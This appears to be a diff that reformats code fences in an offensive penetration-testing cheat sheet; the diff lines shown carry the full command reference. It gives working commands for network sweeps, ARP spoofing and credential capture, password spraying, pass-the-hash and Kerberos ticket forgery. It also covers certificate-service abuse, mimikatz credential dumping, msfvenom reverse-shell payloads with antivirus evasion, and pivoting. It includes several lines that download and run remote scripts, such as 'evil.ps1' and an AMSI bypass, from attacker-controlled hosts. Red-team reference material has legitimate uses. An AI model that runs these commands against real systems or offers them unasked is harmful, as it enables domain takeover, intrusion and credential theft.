@@ -30,7 +30,7 @@ Functions follow after the command prefix.
 
 New pane: c
 Attach existing session:
-```bash=
+```bash
 tmux a
 #OR
 tmux attach -s <session name>
@@ -73,7 +73,7 @@ From reverse shell generator, to MSFVenom syntax, to shell stablilization.
 ## Basic Enumeration with Nmap
 Ping sweep to discover host on the network that respond to ICMP.
 This can be a quick way to discover host.
-```bash=
+```bash
 nmap -sP -PE -v -n -T4 -iL scope.txt -oA nmap/scope-pingsweep --min-hostgroup 256 --min-rate 1280 --exclude MYIP
 
 grep Up nmap/scope-pingsweep.gnmap | cut -d' ' -f2 > nmap/scope-pingsweep-hosts.txt
@@ -86,40 +86,40 @@ Services:
 - SSH (22)
 - SMB (445)
 - RDP (3389)
-```bash=
+```bash
 nmap -sS -p80,443,22,23,445,8080,8443,3389 -Pn -v -n -T4 -iL scope.txt -oA nmap/scope-smalltcpsweep --min-hostgroup 256 --min-rate 1280 --exclude MYIP
 
 grep open/ nmap/scope-smalltcpsweep.gnmap | cut -d' ' -f2 > nmap/scope-smalltcpsweep-hosts.txt
 ```
 
 TCP sweep with Nessus discovery port list minus the above small ports list. Useful for generating a list of host to scan.
-```bash=
+```bash
 nmap -sS -p88,139,135,515,21,6000,1025,25,111,1028,1029,79,497,548,5000,1917,53,161,49000,993,8080,2869 -Pn -v -n -T4 -iL scope.txt -oA nmap/scope-nessustcpsweep-minussmallportslist --min-hostgroup 256 --min-rate 1280 --exclude MYIP
 
 grep open/ nmap/scope-nessustcpsweep-minussmallportslist.gnmap | cut -d' ' -f2 > nmap/scope-nessustcpsweep-minussmallportslist-hosts.txt
 ```
 
 TCP sweep with Nessus discovery port list. A more comprehensive scan using specific ports on less common but still relevant ports. 
-```bash=
+```bash
 nmap -sS -p139,135,445,80,22,515,23,21,6000,1025,25,111,1028,1029,79,497,548,5000,1917,53,161,49000,443,993,8080,2869,88,2222,3389 -Pn -v -n -T4 -iL scope.txt -oA nmap/scope-nessustcpsweep --min-hostgroup 256 --min-rate 1280 --exclude MYIP
 
 grep open/ nmap/scope-nessustcpsweep.gnmap | cut -d' ' -f2 > nmap/scope-nessustcpsweep-hosts.txt
 ```
 
 UDP sweep with arbitrary ports. Fill in the PORTS text with what ever ports you want. 
-```bash=
+```bash
 nmap -sU -pPORTS -Pn -v -n -T4 -iL scope.txt -oA nmap/scope-udpsweep --min-hostgroup 256 --min-rate 1280 --reason --exclude MYIP
 
 grep open/ nmap/scope-udpsweep.gnmap | cut -d' ' -f2 > nmap/scope-udpsweep-hosts.txt
 ```
 
 Combine ping sweep and TCP sweep hosts into one hosts list.
-```bash=
+```bash
 cat nmap/scope-smalltcpsweep-hosts.txt nmap/scope-pingsweep-hosts.txt | sort -u > targets.txt
 ```
 
 Find internal subnets
-```bash=
+```bash
 nmap -n -v -sP -PE 192.168.0-255.1,254 10.0-255.0-255.1,254 172.16-31.0-255.1,254 --min-hostgroup 256 --min-rate 1280 -oA nmap/internalranges-ping
 
 grep Up nmap/internalranges-ping.gnmap  | cut -d\  -f2 | cut -d. -f1-3 | sed 's|$|.0/24|' | sort -uV > foundranges.txt
@@ -132,35 +132,35 @@ cat foundranges.txt knownranges.txt | sort -uV > ranges.txt
 ## Arp Spoofing (godmode)
 
 Initial PCap
-```bash=
+```bash
 timeout 10m tcpdump -ni eth0 -w sensitive/initial.cap 'not (port <x> and tcp)'
 ```
 Protocol Statistics:
-```bash=
+```bash
 tshark -qz io,phs -r initial.cap
 ```
 
 Nmap scan your local subnet to create a list of host to spoof.
-```bash=
+```bash
 nmap -sP -oG - -v -n SUBNET --exclude MYIP,ROUTERIPS | grep 'Status: Up' | cut -d' ' -f2 > mysubnethosts.txt
 ```
 
 Use the Initial PCap to discover HSRP or VRRP, and remove router IPs any host using HSRP or VRRP from the mysubnethosts.txt file.
 
 Set up tooling
-```bash=
+```bash
 # Pcredz
 sudo Pcredz -i eth0
 ```
 
 tcpdump to capture files sent over the wire
-```bash=
+```bash
 # {x} here being iteration. its good to do multiple captures to keep pcap file sizes small
 tcpdump -ni eth0 -w arpspoof{x}.cap 'not port {port used to connect to box if remote}'
 ```
 
 Enable traffic forwarding (plz no DoS network)
-```bash=
+```bash
 echo "1" > /proc/sys/net/ipv4/ip_forward
 ```
 
@@ -284,7 +284,7 @@ While it is running you can copy out the NTLMv2 challenge responses, cleartext c
 After its done running you can use the tshark commands on the tcpdump file to extract any files that were captured in the process.
 
 
-```bash=
+```bash
 sudo echo "1" > /proc/sys/net/ipv4/ip_forward
 sudo Pcredz -i eth0
 tcpdump -ni eth0 -w arpspoof{x}.cap
@@ -311,7 +311,7 @@ tshark -nr arpspoof{x}.cap --export-objects tftp,tftpfiles
 ```
 
 If you run into an error running pcredz regarding libcap. Run these commands.
-```bash=
+```bash
 wget http://http.us.debian.org/debian/pool/main/p/python-libpcap/python-libpcap_0.6.4-1_amd64.deb
 dpkg -i python-libpcap_0.6.4-1_amd64.deb
 ```
@@ -327,7 +327,7 @@ dpkg -i python-libpcap_0.6.4-1_amd64.deb
 ## Odds and Ends
 
 Empty LM Hash
-```bash=
+```bash
 aad3b435b51404eeaad3b435b51404ee
 ```
 
@@ -341,7 +341,7 @@ When trying to obtain credentials theres a plethora of ways to go about it depen
 
 ### Responder (always)
 This tool should always be ran and utilized on engagements. 
-```bash=
+```bash
 # just run
 script -a responder.txt
 sudo responder -I eth0 -wd
@@ -357,7 +357,7 @@ This tool has a plethora of funcitons that you can run all at once.
 
 It will brute force RID, get description fields from ldap, and more.
 
-```bash=
+```bash
 enum4linux -a -d <ip>
 ```
 
@@ -365,12 +365,12 @@ enum4linux -a -d <ip>
 ## Active Directory Enumeration with Credential
 
 Use valid credentials to generate a list of all the domain user accounts.
-```bash=
+```bash
 impacket-GetADUsers -dc-ip <dc-ip> 'domain.local/USER:PASS' -all |awk '{print $1}' > domainusers.txt
 ```
 
 Use RPC to gain additional information
-```bash=
+```bash
 # List Domain Admins group members:
 net rpc group members 'Domain Admins' -U 'DOMAIN/USERNAME%PASSWORD' -S IP
 
@@ -390,7 +390,7 @@ net rpc user info USERNAME -U 'DOMAIN/USERNAME%PASSWORD' -S IP
 ```
 
 Using admin credentials to gain additional credentials or information on lateral movement
-```bash=
+```bash
 # Dump the SAM
 cme smb <target/subnet> -u User -p pass --sam
 
@@ -410,7 +410,7 @@ This is done using a varying set of tools called collectors. They will query the
 
 #### SharpHound
 This collector is the standard collector. It comes as both a PowerShell script and a Compiled C# binary.
-```powershell=
+```powershell
 # Powershell Script
 Import-Module SharpHound.ps1
 Invoke-Bloodhound -CollectionMethod All
@@ -421,18 +421,18 @@ Invoke-Bloodhound -CollectionMethod All
 
 #### Bloodhound Python
 This collector is great due to being able to collect from your attacking machine.
-```bash=
+```bash
 bloodhound-python -u 'User' -p 'Pass' -d domain.local -c all -zip -dc dc01.domain.local -ns 0.0.0.0
 ```
 
 #### RustHound
-```bash=
+```bash
 rusthound -d domain.local -u 'USER@domain.local' -p 'Pass' -z
 ```
 
 #### SilentHound
 This tool enumerates LDAP and has OPSEC/Stealth in mind
-```bash=
+```bash
 silenthound.py -u 'User' -p 'pass' <ip> domain.local -g -n -k --kerberoast
 ```
 
@@ -1524,11 +1524,11 @@ silenthound.py -u 'User' -p 'pass' <ip> domain.local -g -n -k --kerberoast
 ### Brute forcing users
 
 Gather a list of potential usernames and put into usernames.txt
-```bash=
+```bash
 kerbrute userenum -d [DOMAIN FQDN] --dc [DCHOSTNAME] usernames.txt
 ```
 ### Password Spraying
-```bash=
+```bash
 # See Enumeration or AS-REP Roasting to get domainusers.txt or make your own
 kerbrute passwordspray -d [DOMAIN FQDN] domainusers.txt Password123
 ```
@@ -1544,7 +1544,7 @@ This type of attack is simply using the NTLM hash of a domain account for authen
 #### CrackMapExec (CME)
 Doing a PTH with cme is quite easy. 
 You enter the varying fields you want but instead of supplying a password, you supply a hash instead.
-```bash=
+```bash
 cme smb 192.168.0.0/24 -u Administrator -H [...snip...] 
 ```
 
@@ -1555,7 +1555,7 @@ In order for this tool to work, even with valid credentials, the Windows Remote 
 
 To identify if the service is running you can look for the ports `5985` (HTTP) and `5956` (HTTPS) open on a windows host. 
 
-```bash=
+```bash
 # Installation
 gem install evil-winrm
 
@@ -1567,12 +1567,12 @@ Evil-WinRM -i 0.0.0.0 -u Administrator -H [... hash ...]
 ```
 
 Additionally you can have Evil-WinRM preload dotnet binaries as well as powershell scripts
-```bash=
+```bash
 Evil-Winrm -i 0.0.0.0 -u user -p pass -s /opt/powershellscripts/ -e /opt/binaries/
 ```
 
 In-shell menu
-```powershell=
+```powershell
 # will display tools or scripts available
 menu
 
@@ -1619,7 +1619,7 @@ Some additional flags that could be useful.
 
 Rubeus
 
-```powershell=
+```powershell
 Rubeus.exe ptt /ticket:<b64ticket>
 Rubeus.exe ptt /user:USER /pass:PASS
 Rubeus.exe ptt /user:USER /rc4:ntlmhash
@@ -1631,7 +1631,7 @@ Rubeus.exe ptt /user:USER /aes256:hash
 
 
 Tip: convert ticket to UNIX <-> Windows format
-```bash=
+```bash
 
 # Windows -> UNIX
 ticketConverter.py $ticket.kirbi $ticket.ccache
@@ -1644,7 +1644,7 @@ Step 1: Inject Ticket (If you already have ticket, skip to next step)
 
 Windows
 
-```powershell=
+```powershell
 # Rubeus 
 Rubeus.exe ptt /ticket:"base64 | ticket.kirbi"
 
@@ -1657,7 +1657,7 @@ kerberos::ptt $ticket_ccache_file
 ```
 
 Linux
-```bash=
+```bash
 # export the ticket to the enviornment variable so that tools can utilize it.
 export KRB5CCNAME=/full/path/to/ticket.ccache
 ```
@@ -1671,7 +1671,7 @@ To use a different ticket, simply re-export a different ticket.
 Some Examples:
 
 Linux:
-```bash=
+```bash
 # try with -no-pass if you encounter errors
 psexec.py -k 'DOMAIN/USER@TARGET'
 wmiexec.py -k 'DOMAIN/USER@TARGET'
@@ -1683,7 +1683,7 @@ secretsdump.py -k 'DOMAIN/USER@TARGET'
 ```
 
 Windows:
-```powershell=
+```powershell
 #Load the ticket in memory using mimikatz or Rubeus
 mimikatz.exe "kerberos::ptt ticket.kirbi"
 .\Rubeus.exe ptt /ticket:ticket.kirbi
@@ -1704,7 +1704,7 @@ cme smb [snip] -x '$enableRDP'
 cme smb [snip] -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
 ```
 
-```bash=
+```bash
 xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8  /u:USER /pth:<NTLMHash> /v:HOST 
 
 xfreerdp /d: /u: /pth:HASH /v:HOST /cert-ignore -dynamic-resolution /drive:Verified,/path/to/Verified /timeout:60000
@@ -1712,7 +1712,7 @@ xfreerdp /d: /u: /pth:HASH /v:HOST /cert-ignore -dynamic-resolution /drive:Verif
 
 ### RPC
 
-```bash=
+```bash
 python scshell.py 'DOMAIN'/'USER'@192.168.1.11 -hashes :[...hash...] -service-name lfsvc
 
 SCShell> C:\windows\system32\cmd.exe /c powershell.exe -nop -w hidden -c iex(new-object net.webclient).downloadstring('http://10.10.13.37:8080/payload.ps1')
@@ -1720,7 +1720,7 @@ SCShell> C:\windows\system32\cmd.exe /c powershell.exe -nop -w hidden -c iex(new
 
 ### RunAs
 
-```powershell=
+```powershell
 # CMD
 runas /u:user powershell.exe
 
@@ -1742,7 +1742,7 @@ Invoke-Command -ScriptBlock { whoami } -Session $s
 ```
 
 ### SMB 
-```bash=
+```bash
 psexec.py 'domain'/'user':'Passw0rd!'@192.168.11.1
 rlwrap -cAr psexec.py -hashes :[... hash ...] 'domain'/'user'@192.168.11.1 powershell
 ```
@@ -1751,7 +1751,7 @@ rlwrap -cAr psexec.py -hashes :[... hash ...] 'domain'/'user'@192.168.11.1 power
 
 ### PSRemoting
 Windows
-```powershell=
+```powershell
 # PowerShell Remoting
 $SecPassword = ConvertTo-SecureString 'VictimUserPassword' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\targetuser', $SecPassword)
@@ -1773,17 +1773,17 @@ Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Conten
 Invoke-Command -ScriptBlock {powershell.exe -Sta -Nop -Window Hidden -Command "iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10/AMSIBypass.ps1');iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10/evil.ps1')"} -ComputerName dc.targetdomain.com
 ```
 
-```powershell=
+```powershell
 winrs -r:pc.fqdn.local whoami;hostname
 ```
 
-```powershell=
+```powershell
 $sess = New-PSSession -ComputerName 192.168.11.1 -Credential $cred -Authentication Negotiate
 Enter-PSSession -Session $sess
 ```
 
 Identify PSRemoting access availble to current user
-```powershell=
+```powershell
 Import-Module Find-PSRemotingLocalAdminAccess.ps1
 Find-PSRemotingLocalAdminAccess
 ```
@@ -1791,7 +1791,7 @@ Find-PSRemotingLocalAdminAccess
 
 Windows
 
-```powershell=
+```powershell
 # Check Access
 Get-WmiObject -Credential $cred -ComputerName PC01 -Namespace "root" -class "__Namespace" | Select Name
 
@@ -1802,7 +1802,7 @@ Invoke-WmiMethod -Credential $cred -ComputerName PC01 win32_process -Name Create
 
 Linux
 
-```bash=
+```bash
 # Typical Usage
 wmiexec.py 'domain'/'user':'Passw0rd!'@192.168.1.11
 wmiexec.py -hashes :[... hash ...] 'domain'/'user'@192.168.1.11
@@ -1816,7 +1816,7 @@ wmiexec.py -silentcommand -nooutput snovvcrash:'Passw0rd!'@192.168.1.11 'powersh
 
 
 If RPC and SMB are blocked check with WMI
-```powershell=
+```powershell
 Import-Module Find-WMILocalAdminAccess.ps1
 Find-WMILocalAdminAccess
 ```
@@ -1824,7 +1824,7 @@ Find-WMILocalAdminAccess
 
 ### Phishing with Metasploit
 Using Metasploit we can leverage a phishing module to harvest user credentials by harassing them until they enter valid credentials.
-```bash=
+```bash
 msf6> use post/windows/gather/phish_windows_credentials
 msf6> set session 1
 msf6> run
@@ -1871,7 +1871,7 @@ Windows Target
 ## Active Directory Persistence
 
 ### Silver Ticket
-```bash=
+```bash
 # Get Domain SID
 impacket-lookupsid.py 'DOMAIN/USER:PASS@TargetIP'
 
@@ -1891,27 +1891,27 @@ kerberos::golden /krbtgt:<ntlm of krbtgt> /id:500 /sid:<sid> /user:<user to impe
 ```
 
 #### Remote
-```bash=
+```bash
 impacket-secretsdump.py --just-dc-ntlm 'DOMAIN/USER:PASS@TargetIP'
 impacket-lookupsid.py 'DOMAIN/USER:PASS@TargetIP'
 impacket-ticketer.py -nthashes <ntlm> -domain-sid <domain sid> -domain <user>
 ```
 
 ### Diamond Ticket
-```powershell=
+```powershell
 Get-DomainUser -Properties objectsid -Identity <user>
 
 .\Rubeus.exe diamond /tgtdeleg /ticketuser:<user> /ticketuserid:<user RID> /groups:512
 ```
 
 ### Sapphire Ticket
-```bash=
+```bash
 impacket-ticketer.py -request -impersonate 'DomainAdmin' -domain 'DOMAIN.LOCAL' -user 'USER' -password 'PASS' -aesKey 'krbtgt/service AES key' -domain-sid <domain sid> 'EVIL USER'
 ```
 
 ## Active Directory Priv Esc
 ### Kerberoasting
-```bash=
+```bash
 # save output to script file for later
 script -a kerberoast1.txt
 
@@ -1930,7 +1930,7 @@ hashcat -m 13100 kerberoast1.txt rockyou.txt -o kerberoast1-cracked.txt -r rule.
 ```
 
 ### AS-REP Roasting
-```bash=
+```bash
 # save output to script file for later
 script -a asrep1.txt
 
@@ -1954,20 +1954,20 @@ To pull an unconstrained delegation attack off a few tools and some enumeration 
 
 With a compromised host we can import the PowerView enumeration script to see what host are set for unconstrained delegation. So first we import the script.
 
-```powershell=
+```powershell
 Import-Module PowerView.ps1
 ```
 
 Then we query for the host, but ignore any Domain Controllers that show up here because they are not useful for privilege escalation.
 
-```powershell=
+```powershell
 Get-NetComputer -Unconstrained
 ```
 
 Then you need to either abuse existing tickets in memory or find a way to add a new one.
 
 Existing
-```powershell=
+```powershell
 # Using MimiKatz
 .\mimikatz.exe
 privilege::debug
@@ -1995,7 +1995,7 @@ kerberos::list /export
 ```
 
 New using authentication coersion
-```powershell=
+```powershell
 # Using Spoolsample. The target must be a computer account, such as a domain controller.
 # Or you can use social engineering to make someone log into the machine. 
 .\SpoolSample.exe <target> <unconstrinedmachine>
@@ -2009,7 +2009,7 @@ Now to use the tickets gained we can go about this in both linux and windows.
 
 For linux we will need to download them to the attack machine, convert them to a format we can use, and set them in an enviornment variable so that tools can refer to the ticket like a variable.
 
-```bash=
+```bash
 # Download or copy the ticket to your attack box
 
 # CCache -> kirbi
@@ -2026,17 +2026,17 @@ ticket_converter.py ticket.kirbi ticket.ccache
 Use powerview, AD module, or bloodhound to search for users with constrained delegation configured.
 
 powerview
-```powershell=
+```powershell
 Get-DomainUser –TrustedToAuth
 Get-DomainComputer –TrustedToAuth
 ```
 AD module
-```powershell=
+```powershell
 Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
 ```
 
 Utilize Rubeus to request the TGS to the delegated host using the configured SPN or use an alternate service.
-```powershell=
+```powershell
 # Default SPN
 Rubeus.exe s4u /user:appsvc /rc4:1D49D390AC01D568F0EE9BE82BB74D4C /impersonateuser:administrator /msdsspn:CIFS/usmssql.us.techcorp.local /domain:us.techcorp.local /ptt
 
@@ -2046,7 +2046,7 @@ Rubeus.exe s4u /user:appsvc /rc4:1D49D390AC01D568F0EE9BE82BB74D4C /impersonateus
 
 #### Resource Based Constrained Delegation
 
-```powershell=
+```powershell
 # import the necessary toolsets
 Import-Module .\powermad.ps1
 Import-Module .\powerview.ps1
@@ -2110,12 +2110,12 @@ Get-DomainComputer $TargetComputer | Set-DomainObject -Clear 'msds-allowedtoacto
 
 
 Normal
-```powershell=
+```powershell
 
 ```
 
 Kerberos Only
-```powershell=
+```powershell
 
 ```
 
@@ -2129,7 +2129,7 @@ Flag explanations
 - -vulnerable only returns templates that have vulnerabilities
 - -hide-admins hides template vulnerabilies that only Admin level priviliges can abuse.
 
-```bash=
+```bash
 # Find Vulnerable Certificate Templates
 certipy find domain.local/user:pass@domain.local -enabled -vulnerable -hide-admins
 ```
@@ -2142,7 +2142,7 @@ This works if 3 conditions are met.
 - You can authenticate as an enrolle.
 
 
-```bash=
+```bash
 # Locally
 Certify.exe request /ca:dc.domain.local\domain-DC-CA /template:VulnerableTemplate /user:Administrator
 
@@ -2167,7 +2167,7 @@ This misconfiguration is due to a user having the ability to modify a certificat
 
 Ideally if you can manipulate a template you back up the current configuration, modify it to be vulnerable to EC1, exploit EC1, and then use the backup to revert it to the slightly less vulnerable state.
 
-```bash=
+```bash
 certipy template -u user@domain.local -p 'pass' -template VulnTemplate -save-old
 
 certipy req -u user@domain.local -p 'pass' -target ca.domain.local -template VulnTemplate -ca DOMAIN-CA -upn Administrator@domain.local
@@ -2184,7 +2184,7 @@ This works if Web Enrollment is set to true and you can cause authentication coe
 
 A web enrollment service has to be installed and enabled on top of the above.
 
-```bash=
+```bash
 certipy relay -ca <CA_IP> -template DomainController
 
 Coercer coerce -l 127.0.0.1 -t dc.of.target.domain -u user -p 'pass' -d domain.local
@@ -2209,7 +2209,7 @@ Imagine a scenario, where you have gained local administrative access to the Roo
 We can extract the CA's root certificate and use that to "forge" a certificate that we can use to authenticate within the domain.
 
 **Windows:**
-```powershell=
+```powershell
 # Extract CA Root Certificate - (THEFT2)
 SharpDPAPI.exe certificates /machine
 
@@ -2227,7 +2227,7 @@ PassTheCert.exe --server 192.168.210.10 --start-tls --cert-path admin.pfx --cert
 ```
 
 **Linux:**
-```bash=
+```bash
 # Extract CA Certificate
 certipy ca -backup -u 'user@contoso.local' -p 'password' -ca 'ca_name'
 
@@ -2286,7 +2286,7 @@ GodPotato.exe
 ### Users
 
 Add a user in CMD
-```powershell=
+```powershell
 # create user and password
 net user USER PASS /y /add
 
@@ -2295,7 +2295,7 @@ net localgroup Administrators USER /y /add
 ```
 
 Add a user in PowerShell
-```powershell=
+```powershell
 # create password variable
 $pass = ConvertTo-SecureString "PASS" -AsPlainText -Force
 
@@ -2308,7 +2308,7 @@ Add-LocalGroupMember -Groups Administrator -Member "USER"
 ```
 
 Metasploit Module
-```bash=
+```bash
 msf6> use post/windows/manage/add_user
 msf6> set username USER
 msf6> set password PASS
@@ -2320,7 +2320,7 @@ msf6> run
 ## Windows Credential Extraction
 
 remotely
-```powershell=
+```powershell
 # No AV/Disabled
 mimimkatz xD
 ```
@@ -2358,7 +2358,7 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /all"'
 
 ## CrackMapExec Magic
 
-```bash=
+```bash
 # The CMEDB contains useful information and provides exportation capabilities.
 cmedb
 
@@ -2374,23 +2374,23 @@ cat hosts.csv | grep -i 'dc' | cut -d ',' -f 2 > dc.txt
 ## Linux Tips and Tricks
 
 Download files with just bash
-```bash=
+```bash
 bash -c 'cat < /dev/tcp/<ip>/filename' > filename.ext
 ```
 
 Make public RSA key from a private
-```bash=
+```bash
 ssh-keygen -e -y -f id_rsa
 ```
 
 Show listening ports
-```bash=
+```bash
 ss -tulpn
 netstat -anp tcp
 ```
 
 Remove color from script output
-```bash=
+```bash
 sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g"
 ```
 ## Linux Priv Esc
@@ -2500,7 +2500,7 @@ What will be covered below is how to properly generate and use MSFVenom and use 
 <p>You can use HackTools for this as it has a MSFVenom builder, but the basic flags, usage, and generation will be covered.</p>
 
 ### Using MSFVenom to bypass AV using a backdoored binary
-```bash=
+```bash
 # test executable
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.41 LPORT=445 -f exe -o test.exe
 
@@ -2518,7 +2518,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.41 LPORT=445 -f 
 ```
 
 Display avilable encoders for 64 bit systems
-```bash=
+```bash
 msfvenom -l encoders | grep 'x64'
 	x64/xor
 	x64/xor_context
@@ -2529,7 +2529,7 @@ msfvenom -l encoders | grep 'x64'
 ## Tooling (Payload Generation Frameworks)
 
 ### Scarecrow
-```bash=
+```bash
 msfvenom [...snip...] -f raw -o payload.bin
 
 ./ScareCrow -I payload.bin -Loader binary -domain random.domain
@@ -2539,7 +2539,7 @@ msfvenom [...snip...] -f raw -o payload.bin
 
 ### Mangle
 
-```bash=
+```bash
 
 ```
 
@@ -2549,7 +2549,7 @@ msfvenom [...snip...] -f raw -o payload.bin
 ```
 
 ### Donut
-```bash=
+```bash
 msfvenom [...snip...] -f raw -o payload.bin
 
 ./donut -a 2 -f 7 -o payload.bin name.exe
@@ -2557,12 +2557,12 @@ msfvenom [...snip...] -f raw -o payload.bin
 
 ### Limelighter
 
-```bash=
+```bash
 
 ```
 
 ### SysWhispers
-```bash=
+```bash
 
 ```
 
@@ -2581,7 +2581,7 @@ https://github.com/slaeryan/AQUARMOURY/tree/master/Wraith
 # Pivoting, Tunneling, and Port Forwarding
 
 ## Chisel
-```bash=
+```bash
 # Spin up server
 chisel server -p 8000 --reverse
 
@@ -2593,13 +2593,13 @@ proxychains cme smb <subnet>
 ```
 
 ## Sshuttle
-```bash=
+```bash
 sudo sshuttle -r user@ipaddress --ssh-cmd "ssh -i id_rsa" -H 
 sudo sshuttle -r user@ipaddress --ssh-cmd "ssh -i id_rsa" <subnet ie: 192.168.69.0/24> 
 ```
 
 ## Ligolo-NG
-```bash=
+```bash
 # Setup Proxy (Attacker Box)
 sudo ./proxy -selfcert -laddr 0.0.0.0:53
 
